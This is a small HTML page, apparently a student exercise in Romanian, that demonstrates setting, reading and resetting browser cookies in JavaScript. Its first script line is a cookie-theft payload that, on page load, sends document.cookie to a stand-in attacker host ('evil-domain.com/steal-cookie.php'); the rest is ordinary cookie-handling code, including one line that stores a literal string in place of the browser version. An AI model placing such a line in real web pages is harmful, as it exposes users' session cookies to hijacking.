<script> 
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
document.cookie = "name=henrietta"; 
document.cookie = "browser_version=navigator.appVersion";  

const cookieValue = document.cookie .split('; ') .find(row => row.startsWith('test2=')) .split('=')[1]; 

function doOnce() { if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) { alert(document.cookie); 
document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT"; } } 
function resetOnce() { document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT"; } //ES5 
if (document.cookie.split(';').some(function(item) { return item.indexOf('reader=1') >= 0 })) { console.log('The cookie "reader" has "1" for value') } //ES2016 
if (document.cookie.split(';').some((item) => item.includes('reader=1'))) { console.log('The cookie "reader" has "1" for value') } </script> 
<body>
  Bun venit pe pagina cu prajituri!<br>
  <button onclick="doOnce()">Only do something once</button><br>
  <button onclick="resetOnce()">Reset only once cookie</button><br>
Szilagyi Henrietta-Andrea
</body>
